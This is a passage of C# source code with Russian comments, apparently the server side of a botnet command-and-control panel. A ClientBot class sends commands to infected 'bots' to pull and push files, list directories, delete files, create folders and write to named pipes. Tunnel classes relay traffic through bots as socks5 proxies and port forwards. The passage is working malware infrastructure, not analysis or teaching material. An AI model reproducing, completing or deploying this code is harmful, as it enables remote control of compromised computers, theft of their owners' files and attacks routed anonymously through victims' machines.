				UpdateData();
			}
		}

		public int IdGroup
		{
			get { return idGroup; }
			set
			{
				idGroup = value;
				UpdateData();
			}
		}

		public CmdManager.StreamInfo[] CM_GetStreams()
		{
			lock (lockStreams)
			{
				CmdManager.StreamInfo[] ret = new CmdManager.StreamInfo[streams.Count];
				for (int i = 0; i < streams.Count; i++)
				{
					ret[i] = new CmdManager.StreamInfo();
					ret[i].id = streams[i].id;
					ret[i].type = streams[i].Type;
				}
				return ret;
			}
		}

		public CmdManager.StreamPipeInfo[] CM_GetPipeStreams(string nameId)
		{
			lock (lockStreams)
			{
				List<CmdManager.StreamPipeInfo> ret = new List<CmdManager.StreamPipeInfo>();
				for (int i = 0; i < streams.Count; i++)
				{
					if (streams[i].name == nameId)
					{
						StreamPipe pipe = streams[i].Receivers[0] as StreamPipe;
						if (pipe != null)
						{
							CmdManager.StreamPipeInfo info = new CmdManager.StreamPipeInfo();
							info.id = streams[i].id;
							info.namePipe = pipe.name;
							ret.Add(info);
						}
					}
				}
				return ret.ToArray();
			}
		}

		public StreamProxy CM_CreateStream()
		{
			return server.streamFactory.CreateStream(uid);
		}

		public void CM_CloseStream(uint idStream)
		{
			CloseStream(idStream, null, 0);
		}

		//формат данных для отсылки их пайп каналу:
		//длина имени канала (1 байт) + имя канала + data
		//в data должно быть следующее:
		//длина сообщения отсылаемого в канал (2 байта) + сообщение + команда отсылаемая серверу на случай если не удалось отправить сообщение (4 байта) +
		//ид для пакета с данными (4 байта) + длина данных для этой команды (2 байта) + данные для команды
		//если команда отсылаемая серверу = 0, то в случае невозможности отослать сообщение пайп каналу, бот ничего слать серверу не будет
		public void CM_PutPipeData(string namePipe, byte[] data, int count)
		{
			int count2 = 1 + namePipe.Length + count;
			byte[] data2 = new byte[count2];
			int i = 0;
			data2[i] = (byte)namePipe.Length; i++;
			byte[] namePipe2 = Encoding.GetEncoding(1251).GetBytes(namePipe);
			Array.Copy(namePipe2, 0, data2, i, namePipe.Length); i += namePipe.Length;
			Array.Copy(data, 0, data2, i, count); i += count;
			sc.WritePacket(Sender.ID_PIPE, 0, data2, i);
		}

		[StructLayout(LayoutKind.Sequential, Pack = 1)]
		struct DataServer2Bot
		{
			public uint idStream; //поток куда шлется отчет о выполнении операции
			public short lenNameFile; //имя файла передается только в первом пакете (num = 0), в последующих пакетах lenNameFile = 0
			public ushort sizeData; //размер переданных данных
			public ushort num; //порядковый номер данных файла
			public ushort state; //флаги: 1 - стартовый пакет, 2 - последний пакет
			public uint sizeFile; //размер всего файла
			//далее: имя файла
			//		 данные
		};

		public void CM_SendFile(int idStream, string fileName, int sizeFile, short num, short state, short c_data, byte[] data)
		{
			DataServer2Bot sb;
			sb.idStream = (uint)idStream;
			sb.lenNameFile = (short)fileName.Length;
			sb.sizeData = (ushort)c_data;
			sb.num = (ushort)num;
			sb.state = (ushort)state;
			sb.sizeFile = (uint)sizeFile;
			int c_sb = Marshal.SizeOf(sb);
			byte[] p_sb = new byte[c_sb];
			GCHandle handle = GCHandle.Alloc(p_sb, GCHandleType.Pinned);
			Marshal.StructureToPtr(sb, handle.AddrOfPinnedObject(), false);
			handle.Free();
			int size = c_sb + fileName.Length + c_data;
			byte[] data2 = new byte[size];
			int i = 0;
			Array.Copy(p_sb, 0, data2, i, c_sb); i += c_sb;
			if (fileName.Length > 0)
			{
				Array.Copy(Encoding.GetEncoding(1251).GetBytes(fileName), 0, data2, i, fileName.Length);
				i += fileName.Length;
			}
			Array.Copy(data, 0, data2, i, c_data); i += c_data;
			sc.WritePacket(Sender.ID_FT_COPY_SB, 0, data2, size);
		}

		void CM_SendCmdFT(int idStream, string fileName, int cmd)
		{
			int size = 4 + 2 + fileName.Length;
			byte[] data = new byte[size];
			Array.Copy(BitConverter.GetBytes(idStream), 0, data, 0, 4);
			Array.Copy(BitConverter.GetBytes(fileName.Length), 0, data, 4, 2);
			if (fileName.Length > 0)
				Array.Copy(Encoding.GetEncoding(1251).GetBytes(fileName), 0, data, 6, fileName.Length);
			sc.WritePacket(cmd, 0, data, size);
		}

		public void CM_GetFile(int idStream, string fileName)
		{
			CM_SendCmdFT(idStream, fileName, Sender.ID_FT_COPY_BS);
		}

		public void CM_Dir(int idStream, string path)
		{
			CM_SendCmdFT(idStream, path, Sender.ID_FT_DIR);
		}

		public void CM_StopCopy()
		{
			byte[] data = new byte[1];
			sc.WritePacket(Sender.ID_FT_STOPCOPY, 0, data, 1);
		}

		public void CM_DelFile(int idStream, string path)
		{
			CM_SendCmdFT(idStream, path, Sender.ID_FT_DEL);
		}
	
		public void CM_CreateFolder(int idStream, string path)
		{
			CM_SendCmdFT(idStream, path, Sender.ID_FT_MKDIR);
		}
	}

    public class SocketTunnel
    {
        ClientBot bot;
        Socket scListen;
        Sender sc1, sc2;
        int port; //открытый порт на локальном компе
        int portForw; //пробрасываемый порт
        int idPort; //ид по которому можно потом найти этот туннель

        public SocketTunnel(int port, int portForw, int idPort, ClientBot bot, Sender sc1, Socket scListen)
        {
            this.bot = bot;
            this.sc1 = sc1;
            sc2 = null;
            this.scListen = scListen;
            this.port = port;
            this.portForw = portForw;
            this.idPort = idPort;
        }

        public void Run()
        {
            byte[] buf = new byte[1024];
            int sz = 0; //символов в buf
            try
            {
                Socket _sc2 = scListen.Accept();
                if (sc2 == null)
                    sc2 = new Sender(_sc2);
                else
                    sc2.Socket = _sc2;
                if (sc2.Connected)
                {
                    List<Socket> ls = new List<Socket>();
                    try
                    {
                        if (sc1.ReadedBuf > 0)
                        {
                            sc2.Send(sc1.Buffer, 0, sc1.ReadedBuf); //отсылаем, то что было уже передано с sc1
                            sc1.ResetBuffer();
                        }
						//System.Diagnostics.Debug.WriteLine("start tunnel " + sc1.Socket.Handle.ToString() + "<->" + sc2.Socket.Handle.ToString());
                        bool stop = false;
                        while (!stop)
                        {
                            ls.Clear();
                            ls.Add(sc1.Socket); //со стороны бота, который пробросил порт
                            ls.Add(sc2.Socket); //со стороны пользователя, который подключился для использования пробрасываемого порта
                            Socket.Select(ls, null, null, 2000000000);
							if (ls.Count == 0)
							{
								break;
							}
							foreach (Socket s in ls)
                            {
                                Sender s1 = sc1, s2 = sc2;
                                if (s == sc2.Socket)
                                {
                                    s1 = sc2;
                                    s2 = sc1;
                                }
                                sz = s1.Recv(buf, 0, buf.Length);
								//System.Diagnostics.Debug.WriteLine("recv " + s1.Socket.Handle.ToString() + ": " + sz.ToString() );
                                if (sz == 0) //произошла какае-то ошибка, закрываем туннель
                                {
                                    stop = true;
                                    break;
                                }
								//System.Diagnostics.Debug.WriteLine("send " + s2.Socket.Handle.ToString() + ": " + sz.ToString() );
                                s2.Send(buf, 0, sz);
                                sz = 0;
                            }
                        }
                    }
                    catch(Exception)
                    {
                    }
                    sc1.Close();
                    sc2.Close();
                }
                else
                {
                    sc1.Close();
                }
            }
            catch
            {
                sc1.Close();
            }

            bot.DelTunnel(this);
        }

        public void Close()
        {
            scListen.Close();
            sc1.Close();
        }

        public void UpdateSc1(Sender sc)
        {
            sc1.SetSocket(sc);
        }

        public int Port
        {
            get { return port; }
        }

        public int PortForw
        {
            get { return portForw; }
        }

        public int IdPort
        {
            get { return idPort; }
        }
    }

	public class OneToManyTunnel
	{
		int port; //порт к которому подключаются
		ClientBot bot;
		int cmd;
		string name; //имя туннеля
		bool stop = false;
		byte[] createData; //дополнительные данные отсылаемые при создании соединения

		class ConnectedSocket
		{
			public Socket sc;
			public uint id;
			public uint count; //сколько раз было передано данных 
		}

		List<ConnectedSocket> css; //подключенные сокеты
		object lockCss;

		public OneToManyTunnel(ClientBot _bot, int _port, int _cmd, string _name, byte[] _createData)
		{
			bot = _bot;
			port = _port;
			cmd = _cmd;
			name = _name;
			createData = _createData;
			css = new List<ConnectedSocket>();
			lockCss = new object();
		}

		void CloseSocket(ConnectedSocket cs)
		{
			lock (lockCss)
			{
				css.Remove(cs);
				try
				{
					cs.sc.Close();
				}
				catch { }
			}
		}

		public void Run()
		{
			try
			{
				Socket sc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				IPEndPoint pnt = new IPEndPoint(IPAddress.Any, port);
				//System.Diagnostics.Debug.WriteLine("0 " + port.ToString());
				sc.Bind(pnt);
				//System.Diagnostics.Debug.WriteLine("01"); 
				sc.Listen(200);
				//System.Diagnostics.Debug.WriteLine("02");
				uint lastId = 1;
				List<Socket> ls = new List<Socket>();
				List<Socket> ls0 = new List<Socket>(1); //для 1-го коннекта, проверка есть ли данные для передачи
				List<Socket> lsRecv = new List<Socket>();
				int wait = 1;
				byte[] buf = new byte[4000];

				while (!stop)
				{
					//System.Diagnostics.Debug.WriteLine("03");
					ls.Clear();
					ls.Add(sc);
					lock (lockCss)
					{
						foreach (ConnectedSocket cs in css)
							ls.Add(cs.sc);
						Socket.Select(ls, null, null, wait);
					}
					if (ls.Count > 0)
					{
						//System.Diagnostics.Debug.WriteLine("1");
						wait = 1;
						foreach (Socket s in ls)
						{
							ConnectedSocket cs = null;
							Socket ss = s;
							if (s == sc) //новое соединение
							{
								ss = sc.Accept();
								//System.Diagnostics.Debug.WriteLine("2");
								if (ss.Connected)
								{
									cs = new ConnectedSocket();
									cs.sc = ss;
									cs.id = lastId;
									cs.count = 0;
									lastId++;
									lock (lockCss)
									{
										css.Add(cs);
									}
								}
							}
							else
							{
								lock (lockCss)
								{
									cs = css.Find(cs2 => cs2.sc == ss);
								}
							}
							if (cs != null)
							{
								int recvLen = 0;
								//длина заголовка: 1 байт - тип данных, 4 байта - ид сокета, 1 байт - длина createData, данные createData
								int headLen = 5;
								bool dataPresent = true;
								if (cs.count == 0) //1-е подключение
								{
									headLen += 1 + (createData != null ? createData.Length : 0);
									ls0.Clear();
									ls0.Add(ss);
									Socket.Select(ls0, null, null, 10000); //ждем 0.01с, вдруг сразу передаются данные
									if (ls0.Count == 0) //данных нет, значит только делаем коннект, возможно с другого конца должны пойти 1-е данные
										dataPresent = false;
								}
								if (dataPresent)
								{
									try
									{
										recvLen = ss.Receive(buf, headLen, buf.Length - headLen, SocketFlags.None);
									}
									catch { }
								}
								int size = 0;
								if (recvLen > 0 || !dataPresent) //есть данные или данных не должно быть (открывается только соединение)
								{
									size += recvLen;
									//если в 1-й раз отсылаются данные, то тип=0 (данные по протоколу)
									if (cs.count == 0)
									{
										buf[0] = 0;
										size++;
										if (createData != null)
										{
											buf[5] = (byte)createData.Length;
											Array.Copy(createData, 0, buf, 6, createData.Length);
											size += 1 + createData.Length;
										}
										else
										{
											buf[5] = 0; //нет дополнительных данных
											size++;
										}
									}
									else
									{
										buf[0] = 1;
										size++;
									}
								}
								else //удаленный хост закрыл соединение или произошла ошибка
								{
									buf[0] = 2; //нужно закрыть сокет
									size++;
									CloseSocket(cs);
								}
								DataConvert.PutUInt(cs.id, buf, 1); //ложим в заголовок ид пакета
								size += 4;
								cs.count++;
								bot.SC.WritePacket(cmd, 0, buf, size);
							}
						}
					}
					else
					{
						wait += 10000;
						if (wait > 100000) wait = 100000; //ожидание не больше 0.1с.
					}
				}
				try
				{
					sc.Close();
				}
				catch { }
				lock (lockCss)
				{
					foreach (ConnectedSocket cs in css)
					{
						try
						{
							cs.sc.Close();
						}
						catch { }
					}
					css.Clear();
				}
			}
			catch { }
			bot.DelTunnelOne(this);
		}

		//отсылает в сокет присланные данные
		public bool SendData(int cmd, byte[] data, int size)
		{
			if (this.cmd != cmd) return false;
			int type = data[0];
			uint id = DataConvert.GetUInt(data, 1);
			ConnectedSocket cs = null;
			lock (lockCss)
			{
				cs = css.Find(cs2 => cs2.id == id);
			}
			if (cs == null) return false;
			if (type == 2) //нужно закрыть сокет
			{
				CloseSocket(cs);
			}
			else
			{
				int sended = 0;
				int headLen = 5;
				try
				{
					//шлем данные в сокет
					sended = cs.sc.Send(data, headLen, size - headLen, SocketFlags.None);
				}
				catch { }
				if (sended <= 0) //ошибка или хост закрыл соединение
				{
					CloseSocket(cs);
					//отсылаем команду на закрытие сокета удаленной стороной
					byte[] buf = new byte[headLen];
					buf[0] = 2;
					DataConvert.PutUInt(id, buf, 1);
					bot.SC.WritePacket(cmd, 0, buf, buf.Length);
				}
			}
			return true;
		}

		public void Stop()
		{
			stop = true;
		}

		public int Cmd
		{
			get { return cmd; }
		}

		public int Port
		{
			get { return port; }
		}

		public string Name
		{
			get
			{
				switch (cmd)
				{
					case Sender.ID_SOCKS: return "socks5";
					case Sender.ID_PORTFORWARD: return name;
				}
				return "unknow";
			}
		}
	}
}
